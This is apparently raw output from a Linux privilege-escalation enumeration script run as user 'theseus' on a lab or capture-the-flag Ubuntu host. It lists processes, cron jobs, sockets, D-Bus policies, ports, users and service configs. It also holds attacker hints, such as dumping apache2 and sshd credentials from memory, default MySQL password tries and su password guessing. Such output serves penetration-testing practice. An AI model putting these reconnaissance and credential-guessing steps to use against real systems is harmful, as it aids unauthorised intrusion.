Proc 952 with ppid 1 is run by user messagebus but the ppid user is root
Proc 1125 with ppid 1 is run by user whoopsie but the ppid user is root
Proc 1134 with ppid 1 is run by user kernoops but the ppid user is root
Proc 1142 with ppid 1 is run by user kernoops but the ppid user is root
Proc 1205 with ppid 1 is run by user mysql but the ppid user is root
Proc 1238 with ppid 1 is run by user gdm but the ppid user is root
Proc 1263 with ppid 1107 is run by user gdm but the ppid user is root
Proc 1370 with ppid 1 is run by user rtkit but the ppid user is root
Proc 1387 with ppid 1 is run by user gdm but the ppid user is root
Proc 1482 with ppid 1 is run by user colord but the ppid user is root
Proc 1809 with ppid 1171 is run by user www-data but the ppid user is root
Proc 1810 with ppid 1171 is run by user www-data but the ppid user is root
Proc 1812 with ppid 1171 is run by user www-data but the ppid user is root
Proc 1813 with ppid 1171 is run by user www-data but the ppid user is root
Proc 1914 with ppid 1171 is run by user www-data but the ppid user is root
Proc 1932 with ppid 1171 is run by user www-data but the ppid user is root
Proc 1933 with ppid 1171 is run by user www-data but the ppid user is root
Proc 1934 with ppid 1171 is run by user www-data but the ppid user is root
Proc 1935 with ppid 1171 is run by user www-data but the ppid user is root
Proc 2204 with ppid 1171 is run by user www-data but the ppid user is root
Proc 2426 with ppid 1 is run by user theseus but the ppid user is root
Proc 2438 with ppid 2425 is run by user theseus but the ppid user is root
Proc 2550 with ppid 2459 is run by user theseus but the ppid user is root
Proc 2587 with ppid 2586 is run by user theseus but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                      
COMMAND    PID  TID             USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME                                                                                         

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                                                                      
gdm-password Not Found                                                                                                                                                                  
gnome-keyring-daemon Not Found                                                                                                                                                          
lightdm Not Found                                                                                                                                                                       
vsftpd Not Found                                                                                                                                                                        
apache2 process found (dump creds from memory as root)                                                                                                                                  
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                  
/usr/bin/crontab                                                                                                                                                                        
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 15  2017 /etc/crontab                                                                                                                                

/etc/cron.d:
total 32
drwxr-xr-x   2 root root  4096 Mar 13  2020 .
drwxr-xr-x 127 root root 12288 Jul 12  2021 ..
-rw-r--r--   1 root root   285 May 29  2017 anacron
-rw-r--r--   1 root root   712 Dec 17  2018 php
-rw-r--r--   1 root root   102 Nov 15  2017 .placeholder
-rw-r--r--   1 root root   191 Oct 15  2019 popularity-contest

/etc/cron.daily:
total 76
drwxr-xr-x   2 root root  4096 Mar 20  2020 .
drwxr-xr-x 127 root root 12288 Jul 12  2021 ..
-rwxr-xr-x   1 root root   311 May 29  2017 0anacron
-rwxr-xr-x   1 root root   539 Jul 16  2019 apache2
-rwxr-xr-x   1 root root   376 Nov 20  2017 apport
-rwxr-xr-x   1 root root  1478 Apr 20  2018 apt-compat
-rwxr-xr-x   1 root root   355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root   384 Dec 12  2012 cracklib-runtime
-rwxr-xr-x   1 root root  1176 Nov  2  2017 dpkg
-rwxr-xr-x   1 root root   372 Aug 21  2017 logrotate
-rwxr-xr-x   1 root root  1065 Apr  7  2018 man-db
-rwxr-xr-x   1 root root   538 Mar  1  2018 mlocate
-rwxr-xr-x   1 root root   249 Jan 25  2018 passwd
-rw-r--r--   1 root root   102 Nov 15  2017 .placeholder
-rwxr-xr-x   1 root root  3477 Feb 20  2018 popularity-contest
-rwxr-xr-x   1 root root   246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x   1 root root   214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Aug  5  2019 .
drwxr-xr-x 127 root root 12288 Jul 12  2021 ..
-rw-r--r--   1 root root   102 Nov 15  2017 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 Aug  5  2019 .
drwxr-xr-x 127 root root 12288 Jul 12  2021 ..
-rwxr-xr-x   1 root root   313 May 29  2017 0anacron
-rw-r--r--   1 root root   102 Nov 15  2017 .placeholder

/etc/cron.weekly:
total 32
drwxr-xr-x   2 root root  4096 Aug  5  2019 .
drwxr-xr-x 127 root root 12288 Jul 12  2021 ..
-rwxr-xr-x   1 root root   312 May 29  2017 0anacron
-rwxr-xr-x   1 root root   723 Apr  7  2018 man-db
-rw-r--r--   1 root root   102 Nov 15  2017 .placeholder
-rwxr-xr-x   1 root root   211 Nov 12  2018 update-notifier-common

/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Jul  6  2021 .
drwxr-xr-x 6 root root 4096 Jul  6  2021 ..
-rw------- 1 root root    9 Feb 23 08:14 cron.daily
-rw------- 1 root root    9 Feb 23 08:23 cron.monthly
-rw------- 1 root root    9 Feb 23 08:18 cron.weekly

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )


SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

1       5       cron.daily      run-parts --report /etc/cron.daily
7       10      cron.weekly     run-parts --report /etc/cron.weekly
@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                                                          
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                                                             

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                                             
/etc/systemd/system/multi-user.target.wants/networking.service could be executing some relative path                                                                                    
/etc/systemd/system/network-online.target.wants/networking.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                               
NEXT                         LEFT        LAST                         PASSED       UNIT                         ACTIVATES                                                               
Fri 2024-02-23 11:01:59 PST  13min left  Fri 2024-02-23 10:04:37 PST  43min ago    anacron.timer                anacron.service
Fri 2024-02-23 11:09:00 PST  20min left  Fri 2024-02-23 10:39:02 PST  9min ago     phpsessionclean.timer        phpsessionclean.service
Fri 2024-02-23 17:21:58 PST  6h left     Fri 2024-02-23 08:08:58 PST  2h 39min ago motd-news.timer              motd-news.service
Fri 2024-02-23 23:48:09 PST  12h left    Fri 2024-02-23 08:08:58 PST  2h 39min ago apt-daily.timer              apt-daily.service
Sat 2024-02-24 06:01:27 PST  19h left    Fri 2024-02-23 08:08:58 PST  2h 39min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Sat 2024-02-24 08:23:59 PST  21h left    Fri 2024-02-23 08:23:59 PST  2h 24min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2024-02-26 00:00:00 PST  2 days left Fri 2024-02-23 08:08:58 PST  2h 39min ago fstrim.timer                 fstrim.service
n/a                          n/a         n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a         n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                               
                                                                                                                                                                                        
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                              
/etc/systemd/system/sockets.target.wants/avahi-daemon.socket is calling this writable listener: /run/avahi-daemon/socket                                                                
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/avahi-daemon.socket is calling this writable listener: /run/avahi-daemon/socket
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request
/snap/core/11316/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/11316/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/11316/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/11316/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/11316/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core/11316/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core/11316/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/11316/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/11316/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/11316/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core18/1668/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core18/1668/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core18/1668/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core18/1668/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core18/1668/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                              
/run/acpid.socket                                                                                                                                                                       
  └─(Read Write)
/run/avahi-daemon/socket
  └─(Read Write)
/run/cups/cups.sock
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1000/bus
  └─(Read Write)
/run/user/1000/gnupg/S.dirmngr
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.browser
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.extra
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.ssh
  └─(Read Write)
/run/user/1000/snapd-session-agent.socket
  └─(Read Write)
/run/user/1000/systemd/notify
  └─(Read Write)
/run/user/1000/systemd/private
  └─(Read Write)
/run/user/121/bus
/run/user/121/gnupg/S.dirmngr
/run/user/121/gnupg/S.gpg-agent
/run/user/121/gnupg/S.gpg-agent.browser
/run/user/121/gnupg/S.gpg-agent.extra
/run/user/121/gnupg/S.gpg-agent.ssh
/run/user/121/pulse/native
/run/user/121/snapd-session-agent.socket
/run/user/121/systemd/private
/run/user/121/wayland-0
/run/uuidd/request
  └─(Read Write)
/run/vmware/guestServicePipe
  └─(Read Write)
/tmp/dbus-7vAj8eGo
/tmp/dbus-9nEywRTa
/tmp/dbus-AvkwU389
/tmp/dbus-OPDPHCjdQO
/tmp/dbus-SBrR3LFa
/tmp/dbus-XL3apx98
/tmp/.ICE-unix/1276
  └─(Read Write)
/tmp/.X11-unix/X1024
  └─(Read )
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy user="avahi">)                                                                                       
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy group="netdev">)
Possible weak user policy found on /etc/dbus-1/system.d/bluetooth.conf (  <policy group="bluetooth">
  <policy group="lp">)
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/gdm.conf (  <policy user="gdm">)
Possible weak user policy found on /etc/dbus-1/system.d/kerneloops.conf (  <policy user="kernoops">)
Possible weak user policy found on /etc/dbus-1/system.d/net.hadess.SensorProxy.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.ColorManager.conf (  <policy user="colord">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.Agent.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.NetworkManager.conf (        <policy user="whoopsie">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.RealtimeKit1.conf (  <policy user="rtkit">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)
Possible weak user policy found on /etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf (  <policy user="cups-pk-helper">)
Possible weak user policy found on /etc/dbus-1/system.d/pulseaudio-system.conf (  <policy user="pulse">)
Possible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf (        <policy group="netdev">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                
NAME                                       PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION                                          
:1.0                                       927 systemd-logind  root             :1.0          systemd-logind.service    -          -                  
:1.1                                       811 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
:1.10                                     1014 polkitd         root             :1.10         polkit.service            -          -                  
:1.13                                      951 networkd-dispat root             :1.13         networkd-dispatcher.se…ce -          -                  
:1.14                                     1001 NetworkManager  root             :1.14         NetworkManager.service    -          -                  
:1.18                                     1098 gdm3            root             :1.18         gdm.service               -          -                  
:1.19                                     1107 gdm-session-wor root             :1.19         session-c1.scope          c1         -                  
:1.2                                         1 systemd         root             :1.2          init.scope                -          -                  
:1.20                                     1134 kerneloops      kernoops         :1.20         kerneloops.service        -          -                  
:1.21                                     1142 kerneloops      kernoops         :1.21         kerneloops.service        -          -                  
:1.22                                     1125 whoopsie        whoopsie         :1.22         whoopsie.service          -          -                  
:1.24                                     1125 whoopsie        whoopsie         :1.24         whoopsie.service          -          -                  
:1.26                                     1238 systemd         gdm              :1.26         user@121.service          -          -                  
:1.28                                     1276 gnome-session-b gdm              :1.28         session-c1.scope          c1         -                  
:1.29                                     1309 gnome-shell     gdm              :1.29         session-c1.scope          c1         -                  
:1.3                                       917 avahi-daemon    avahi            :1.3          avahi-daemon.service      -          -                  
:1.30                                     1339 upowerd         root             :1.30         upower.service            -          -                  
:1.32                                     1370 rtkit-daemon    root             :1.32         rtkit-daemon.service      -          -                  
:1.369                                   12427 busctl          theseus          :1.369        session-40.scope          40         -                  
:1.47                                     1408 boltd           root             :1.47         bolt.service              -          -                  
:1.48                                     1415 packagekitd     root             :1.48         packagekit.service        -          -                  
:1.49                                     1436 gsd-media-keys  gdm              :1.49         session-c1.scope          c1         -                  
:1.50                                     1429 gsd-color       gdm              :1.50         session-c1.scope          c1         -                  
:1.51                                     1432 gsd-keyboard    gdm              :1.51         session-c1.scope          c1         -                  
:1.52                                     1482 colord          colord           :1.52         colord.service            -          -                  
:1.53                                     1446 gsd-power       gdm              :1.53         session-c1.scope          c1         -                  
:1.58                                     1822 cupsd           root             :1.58         cups.service              -          -                  
:1.59                                     1823 cups-browsed    root             :1.59         cups-browsed.service      -          -                  
:1.6                                       944 accounts-daemon[0m root             :1.6          accounts-daemon.service   -          -                  
:1.60                                     1823 cups-browsed    root             :1.60         cups-browsed.service      -          -                  
:1.7                                       925 udisksd         root             :1.7          udisks2.service           -          -                  
:1.8                                       923 ModemManager    root             :1.8          ModemManager.service      -          -                  
:1.9                                      1000 wpa_supplicant  root             :1.9          wpa_supplicant.service    -          -                  
com.hp.hplip                                 - -               -                (activatable) -                         -         
com.ubuntu.LanguageSelector                  - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties                - -               -                (activatable) -                         -         
com.ubuntu.SystemService                     - -               -                (activatable) -                         -         
com.ubuntu.USBCreator                        - -               -                (activatable) -                         -         
com.ubuntu.WhoopsiePreferences               - -               -                (activatable) -                         -         
fi.epitest.hostap.WPASupplicant           1000 wpa_supplicant  root             :1.9          wpa_supplicant.service    -          -                  
fi.w1.wpa_supplicant1                     1000 wpa_supplicant  root             :1.9          wpa_supplicant.service    -          -                  
io.netplan.Netplan                           - -               -                (activatable) -                         -         
org.bluez                                    - -               -                (activatable) -                         -         
org.debian.apt                               - -               -                (activatable) -                         -         
org.freedesktop.Accounts                   944 accounts-daemon[0m root             :1.6          accounts-daemon.service   -          -                  
org.freedesktop.Avahi                      917 avahi-daemon    avahi            :1.3          avahi-daemon.service      -          -                  
org.freedesktop.ColorManager              1482 colord          colord           :1.52         colord.service            -          -                  
org.freedesktop.DBus                         1 systemd         root             -             init.scope                -          -                  
org.freedesktop.GeoClue2                     - -               -                (activatable) -                         -         
org.freedesktop.ModemManager1              923 ModemManager    root             :1.8          ModemManager.service      -          -                  
org.freedesktop.NetworkManager            1001 NetworkManager  root             :1.14         NetworkManager.service    -          -                  
org.freedesktop.PackageKit                1415 packagekitd     root             :1.48         packagekit.service        -          -                  
org.freedesktop.PolicyKit1                1014 polkitd         root             :1.10         polkit.service            -          -                  
org.freedesktop.RealtimeKit1              1370 rtkit-daemon    root             :1.32         rtkit-daemon.service      -          -                  
org.freedesktop.UDisks2                    925 udisksd         root             :1.7          udisks2.service           -          -                  
org.freedesktop.UPower                    1339 upowerd         root             :1.30         upower.service            -          -                  
org.freedesktop.bolt                      1408 boltd           root             :1.47         bolt.service              -          -                  
org.freedesktop.fwupd                        - -               -                (activatable) -                         -         
org.freedesktop.hostname1                    - -               -                (activatable) -                         -         
org.freedesktop.locale1                      - -               -                (activatable) -                         -         
org.freedesktop.login1                     927 systemd-logind  root             :1.0          systemd-logind.service    -          -                  
org.freedesktop.network1                     - -               -                (activatable) -                         -         
org.freedesktop.nm_dispatcher                - -               -                (activatable) -                         -         
org.freedesktop.resolve1                   811 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
org.freedesktop.systemd1                     1 systemd         root             :1.2          init.scope                -          -                  
org.freedesktop.thermald                     - -               -                (activatable) -                         -         
org.freedesktop.timedate1                    - -               -                (activatable) -                         -         
org.gnome.DisplayManager                  1098 gdm3            root             :1.18         gdm.service               -          -                  
org.opensuse.CupsPkHelper.Mechanism          - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                     
                              ╚═════════════════════╝                                                                                                                                   
╔══════════╣ Hostname, hosts and DNS
ubuntu                                                                                                                                                                                  
127.0.0.1       localhost
127.0.1.1       ubuntu

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                     
link-local 169.254.0.0
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.164.192  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:feb0:ce5c  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb0:ce5c  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b0:ce:5c  txqueuelen 1000  (Ethernet)
        RX packets 205217  bytes 22398624 (22.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 155701  bytes 62288849 (62.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 10873  bytes 856087 (856.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10873  bytes 856087 (856.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                           
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                                                       
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                                      
                                                                                                                                                                                        


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                                     
                               ╚═══════════════════╝                                                                                                                                    
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                                                
uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)                                                                                                                     

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                                            
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                        
                                                                                                                                                                                        
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                        
                                                                                                                                                                                        
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                                                  
ptrace protection is enabled (1)                                                                                                                                                        

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                              
                                                                                                                                                                                        
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                         

╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash                                                                                                                                                         
theseus:x:1000:1000:Theseus,,,:/home/theseus:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                  
uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(uuidd) gid=111(uuidd) groups=111(uuidd)
uid=106(avahi-autoipd) gid=112(avahi-autoipd) groups=112(avahi-autoipd)
uid=107(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=108(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=109(rtkit) gid=114(rtkit) groups=114(rtkit)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(cups-pk-helper) gid=116(lpadmin) groups=116(lpadmin)
uid=111(speech-dispatcher) gid=29(audio) groups=29(audio)
uid=112(whoopsie) gid=117(whoopsie) groups=117(whoopsie)
uid=113(kernoops) gid=65534(nogroup) groups=65534(nogroup)
uid=114(saned) gid=119(saned) groups=119(saned),118(scanner)
uid=115(pulse) gid=120(pulse) groups=120(pulse),29(audio)
uid=116(avahi) gid=122(avahi) groups=122(avahi)
uid=117(colord) gid=123(colord) groups=123(colord)
uid=118(hplip) gid=7(lp) groups=7(lp)
uid=119(geoclue) gid=124(geoclue) groups=124(geoclue)
uid=120(gnome-initial-setup) gid=65534(nogroup) groups=65534(nogroup)
uid=121(gdm) gid=125(gdm) groups=125(gdm)
uid=122(mysql) gid=127(mysql) groups=127(mysql)
uid=123(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 10:48:18 up  2:39,  1 user,  load average: 0.97, 0.31, 0.11                                                                                                                            
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
theseus  pts/3    10.10.14.82      10:32    1:21   0.12s  0.00s sh

╔══════════╣ Last logons
theseus  pts/3        Fri Feb 23 10:32:18 2024   still logged in                       10.10.14.82                                                                                      

wtmp begins Fri Feb 23 10:32:18 2024

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                                       
theseus          pts/3    10.10.14.82      Fri Feb 23 10:32:18 -0800 2024

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
                                                                                                                                                                                        
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                                        


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                                      
                             ╚══════════════════════╝                                                                                                                                   
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                                         
/usr/bin/g++
/usr/bin/gcc
/usr/bin/gdb
/usr/bin/make
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  g++                                        4:7.4.0-1ubuntu2.3                               amd64        GNU C++ compiler                                                           
ii  g++-7                                      7.5.0-3ubuntu1~18.04                             amd64        GNU C++ compiler
ii  gcc                                        4:7.4.0-1ubuntu2.3                               amd64        GNU C compiler
ii  gcc-7                                      7.5.0-3ubuntu1~18.04                             amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ MySQL version
mysql Not Found                                                                                                                                                                         
                                                                                                                                                                                        

═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                                                                                              
═╣ MySQL connection using root/NOPASS ................. No                                                                                                                              
                                                                                                                                                                                        
╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql                                                                                                         
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)
                                                                                                                                                                                        
-rw------- 1 root root 317 Mar 13  2020 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.29 (Ubuntu)                                                                                                                                  
Server built:   2020-03-13T12:26:16
httpd Not Found
                                                                                                                                                                                        
Nginx version: nginx Not Found
                                                                                                                                                                                        
/etc/apache2/mods-enabled/php5.6.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-enabled/php5.6.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php5.6.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php5.6.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php7.3.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.3.conf:    SetHandler application/x-httpd-php
--
